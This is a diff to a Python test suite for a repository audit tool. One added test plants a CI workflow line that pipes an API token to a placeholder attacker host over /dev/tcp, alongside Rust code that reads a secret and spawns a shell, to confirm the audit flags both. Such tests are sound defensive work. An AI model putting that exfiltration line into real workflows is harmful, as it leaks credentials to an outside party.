@@ -156,12 +156,41 @@ class V2CoreAuditTests(unittest.TestCase):
             for directory in (ROOT/".github/workflows",ROOT/".github"):
                 if directory.exists() and not any(directory.iterdir()):directory.rmdir()
 
+    def test_lowercase_secret_process_and_dev_tcp_bypasses_fail_closed(self):
+        provider=ROOT/"crates/habitat-provider-transport/src/lib.rs";original=provider.read_text()
+        workflow=ROOT/".github/workflows/lowercase-bypass.yml"
+        try:
+            provider.write_text(original+'\npub fn bypass(){ let provider_api_key=std::env::var("provider_api_key").unwrap(); std::process::Command::new("sh"); }\n')
+            workflow.parent.mkdir(parents=True,exist_ok=True)
+            workflow.write_text('steps:\n  - run: echo "$anthropic_token" > /dev/tcp/attacker.invalid/443\n')
+            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
+            self.assertNotEqual(result.returncode,0)
+            self.assertTrue("provider-direct-effect-path" in result.stdout or "secret-external-effect-path" in result.stdout)
+        finally:
+            provider.write_text(original)
+            if workflow.exists():workflow.unlink()
+            for directory in (ROOT/".github/workflows",ROOT/".github"):
+                if directory.exists() and not any(directory.iterdir()):directory.rmdir()
+
+    def test_extern_public_api_is_inventoried(self):
+        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
+        try:
+            source.write_text(original+'\npub extern "C" fn hidden_public_api() {}\n')
+            with tempfile.TemporaryDirectory() as temporary:
+                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
+            self.assertEqual(result.returncode,0,result.stdout)
+            self.assertTrue(any("hidden_public_api" in item["identity"] for item in report["records"] if item["kind"]=="public_interface"))
+        finally:source.write_text(original)
+
     def test_nix_shell_and_workflow_branches_are_inventoried(self):
         with tempfile.TemporaryDirectory() as temporary:
             output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
         self.assertEqual(result.returncode,0,result.stdout)
         branches=[item["identity"] for item in report["records"] if item["kind"]=="branch"]
         self.assertTrue(any(value.startswith("nix/modules/habitat-image.nix:") for value in branches))
+        self.assertIn("flake.nix:283:script-branch",branches)
+        self.assertIn("nix/modules/habitat-image.nix:133:script-branch",branches)
+        self.assertNotIn("flake.nix:303:script-branch",branches)
 
     def test_nested_enum_and_brace_macro_public_surfaces_are_inventoried(self):
         source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
